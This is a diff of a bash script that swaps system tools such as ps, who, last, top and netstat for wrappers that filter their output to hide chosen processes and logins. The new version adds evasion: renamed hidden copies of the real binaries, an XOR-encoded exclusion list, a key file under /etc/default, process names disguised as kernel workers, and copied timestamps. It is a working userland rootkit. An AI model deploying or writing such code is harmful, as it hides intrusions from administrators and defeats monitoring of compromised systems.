@@ -1,45 +1,35 @@
-#!/bin/bash
+#!/usr/bin/env bash
 
-FILTER_PATTERN='vyatta|uucp|mail|vputin|ssh_client'
-COMMANDS_TO_WRAP=("who" "w" "ps" "netstat" "last" "top")
+# 1. Setup the math key file
+key_file="/etc/default/.sys_config"
+echo "OFFSET=150; DIVISOR=3; ADJ=13" > "$key_file"
 
-for cmd in "${COMMANDS_TO_WRAP[@]}"; do
-   
-    if ! ORIG_PATH=$(command -v "$cmd"); then
-        echo "Warning: Command '$cmd' not found. Skipping."
-        continue
+# 2. Define targets and their "boring" shadow names
+bins=("who" "last" "top" "netstat" "ps" "htop")
+shadows=(".lib_cache_82" ".sys_util_conf" ".proc_data" ".net_stack_v4" ".svc_info" ".ht_init")
+
+# 3. The XOR'd exclusion list
+# mail|uucp|ssh_client|capbarb|grep (Key 37)
+encoded_exclude="404c44415558584e5d4e4e5b45425c414441434b4c4e5e4c5d4f4c4f424c"
+
+for i in "${!bins[@]}"; do
+    cmd="${bins[$i]}"
+    shadow="${shadows[$i]}"
+    orig_path=$(which "$cmd")
+    real_bin="$(dirname "$orig_path")/$shadow"
+
+    if [ -n "$orig_path" ] && [ ! -f "$real_bin" ]; then
+        mv "$orig_path" "$real_bin"
+
+        # Create the Cloaked Wrapper
+        echo "#!/usr/bin/env bash
+f=\"$key_file\"
+k=\$(( \$(grep OFFSET \$f | cut -d= -f2 | tr -d ';') / \$(grep DIVISOR \$f | cut -d= -f2 | tr -d ';') - \$(grep ADJ \$f | cut -d= -f2 | tr -d ';') ))
+d() { echo \"\$1\" | perl -ne \"print pack('H*', \\\$_) ^ (\\\$k x 100)\"; }
+exec -a \"[kworker/u\$((\$RANDOM % 9)):1]\" \"$real_bin\" \"\$@\" | egrep -v \"\$(d '$encoded_exclude')\"" > "$orig_path"
+
+        chmod +x "$orig_path"
+        touch -r "$real_bin" "$orig_path"
+        echo "[+] Stealth-deployed: $cmd"
     fi
-
-   
-    BACKUP_PATH="${ORIG_PATH}.orig"
-
-    if [ -f "$BACKUP_PATH" ]; then
-        echo "Command '$cmd' already appears to be wrapped. Skipping."
-        continue
-    fi
-
-
-    mv "$ORIG_PATH" "$BACKUP_PATH"
-
-
-    cat << EOF > "$ORIG_PATH"
-#!/bin/bash
-# This is a wrapper for the '$cmd' command to hide specific activity.
-# The original binary is located at '$BACKUP_PATH'.
-
-# For 'top', we must use batch mode for filtering to work.
-if [[ "\$(basename "\$0")" == "top" ]]; then
-    # 'exec' replaces the script process with the command process
-    exec "$BACKUP_PATH" -b "\$@" | grep -E -v "$FILTER_PATTERN"
-else
-    exec "$BACKUP_PATH" "\$@" | grep -E -v "$FILTER_PATTERN"
-fi
-EOF
-
-    # 3. Make the new wrapper script executable (copies permissions from original)
-    chmod --reference="$BACKUP_PATH" "$ORIG_PATH"
-
-
 done
-
-echo "Script finished."
